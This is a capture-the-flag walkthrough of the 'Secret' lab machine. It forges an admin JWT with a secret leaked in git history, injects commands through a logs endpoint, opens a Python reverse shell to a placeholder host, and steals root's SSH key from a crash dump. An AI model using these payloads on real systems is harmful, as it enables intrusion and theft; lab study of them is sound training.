# Secret

First as usual, `nmap`.

```
# Nmap 7.92 scan initiated Sun Oct 31 14:21:03 2021 as: nmap -vvv -p 22,80,3000 -sCV -oA init 10.129.224.184
Nmap scan report for 10.129.224.184
Host is up, received conn-refused (0.30s latency).
Scanned at 2021-10-31 14:21:10 +07 for 22s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=
|   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
3000/tcp open  http    syn-ack Node.js (Express middleware)
|_http-title: DUMB Docs
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 31 14:21:32 2021 -- 1 IP address (1 host up) scanned in 29.57 seconds
```

Looking at the pages on port 80 and 3000, they look like the same thing. Also, on both pages, we can download some source code. Running `diff` on the 2 downloads, they're the same ZIP file.

Looking around the source code, considering the box is named "Secret", we `grep` for the string "secret" (case-insensitive) and find that a secret token is used with JWTs and the secret token is in the file `.env`, which has the following content.

```
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

However, looking at the commit history, we have commit `67d8da7a` with the commit message "removed .env for security reasons", where we can find the actual secret.

```
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
```

Looking in `index.js`, we have 3 routes: `/`, `/api/`, and `/api/user`. Investigating `privRoute`, it's `require`'d from `routes/private.js`. Checking the code of `private.js`, we see a couple of endpoints: `/priv` and `/logs`, and visiting them gives us the error "Access Denied" which comes from `verifytoken.js`. Looking at `verifytoken.js`, we see that we need to set the header `auth-token` to a JWT, and `private.js` tells us we should set the user to be `theadmin`, so we do just that. Using line 62 of `auth.js` as the guide to creating a signed JWT, we create the JWT in `node`.

```javascript
jwt = require("jsonwebtoken")
jwt.sign({ _id: 1, name: "theadmin", email: "theadmin@secret.htb"}, "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE" )
```

With the header `auth-token` set, we should be logged in as `theadmin`. Looking at the 2 pages (port 80 and 3000), they're still the same. Looking at the code in `private.js` for `/logs`, we see that have potential code execution by injecting the `file` parameter. I tried the following URL.

```
http://10.129.224.184/api/logs?file=67d8da7a;%20id
```

This executed `id` and got us the following output.

```
"uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
```

The output is still the same between the 2 applications (port 80 and 3000). Trying `hostname`, both return `secret\n` so we can confirm that they're likely on the same host (not in a container). We've confirmed that we have command injection so we can get a reverse shell. I used the following URL-encoded python reverse shell.

```
%3bpython3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("IP",PORT))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("/bin/sh")'
```

I then added my own SSH key to get a better shell and better persistence.

Checking listening ports ...

```sh
dasith@secret:~$ ss -tlnp
State        Recv-Q       Send-Q               Local Address:Port                Peer Address:Port       Process
LISTEN       0            4096                     127.0.0.1:27017                    0.0.0.0:*
LISTEN       0            511                        0.0.0.0:80                       0.0.0.0:*
LISTEN       0            4096                 127.0.0.53%lo:53                       0.0.0.0:*
LISTEN       0            128                        0.0.0.0:22                       0.0.0.0:*
LISTEN       0            511                           [::]:80                          [::]:*
LISTEN       0            128                           [::]:22                          [::]:*
LISTEN       0            511                              *:3000                           *:*           users:(("node /home/dasi",pid=1135,fd=20))
```

We see mongodb on port 27017 as previously found in `.env`. We can enumerate the databases.

```
> show dbs
admin     0.000GB
auth-web  0.000GB
config    0.000GB
local     0.000GB

> use auth-web
switched to db auth-web

> db.getCollection("users").find({})
{ "_id" : ObjectId("6131bf09c6c27d0b05c16691"), "name" : "theadmin", "email" : "admin@admins.com", "password" : "$2a$10$SJ8vlQEJYL2J673Xte6BNeMmhHBioLSn6/wqMz2DKjxwQzkModUei", "date" : ISODate("2021-09-03T06:22:01.581Z"), "__v" : 0 }
{ "_id" : ObjectId("6131bfb7c6c27d0b05c16699"), "name" : "user222", "email" : "user@google.com", "password" : "$2a$10$WmuQwihUQkzSrRoYakQdI.5hdjo820LNxSfEYATaBoTa/QXJmEbDS", "date" : ISODate("2021-09-03T06:24:55.832Z"), "__v" : 0 }
{ "_id" : ObjectId("6131d73387dee30378c66556"), "name" : "newuser", "email" : "root@dasith.works", "password" : "$2a$10$wnvh2al2ABafCszb9oWi/.YIXHX4RrTUiWAIVUlv2Z80lkvmlIUQW", "date" : ISODate("2021-09-03T08:05:07.991Z"), "__v" : 0 }
{ "_id" : ObjectId("613904ae8a27cb040c65de17"), "name" : "dasith", "email" : "dasiths2v2@gmail.com", "password" : "$2a$10$S/GbYplKgIU4oFdTDsr2SeOJreht3UgIA0MdT7F50EtiBy7ymzFBO", "date" : ISODate("2021-09-08T18:45:02.187Z"), "__v" : 0 }
```

I tried cracking the hashes but only got newuser's password: `mypassword`.

Looking in `/opt`, we have some interesting files.

```sh
dasith@secret:/opt$ ls -la
total 56
drwxr-xr-x  2 root root  4096 Oct  7 10:06 .
drwxr-xr-x 20 root root  4096 Oct  7 15:01 ..
-rw-r--r--  1 root root  3736 Oct  7 10:01 code.c
-rw-r--r--  1 root root 16384 Oct  7 10:01 .code.c.swp
-rwsr-xr-x  1 root root 17824 Oct  7 10:03 count
-rw-r--r--  1 root root  4622 Oct  7 10:04 valgrind.log
```

An SUID binary and its source code. We don't have dangerous function calls, but we do have core dump enabled with `prctl(PR_SET_DUMPABLE, 1);`. Checknig `ulimit -c`, it returns `0` so we don't have core dumps by default. To get core dumps, set an actual limit or make it unlimited with `ulimit -c unlimited`. We can then run the binary, make it read `/root/.ssh/id_rsa`, stop at "Save results a file?" (after the file read and setting the core dump), and crash it with `kill -SIGSEGV $(pidof count)` (in another shell). The crash report can be found in `/var/crash`. We can then extract information from the report with `apport-unpack /var/crash/_opt_count.1000.crash /path/to/emptydir` and the core dump should be in the provided directory. We can then run `strings` on the core dump to get root's SSH key which lies after the line "/root/.ssh/id_rsa".

With that, we can SSH in as root on the machine.
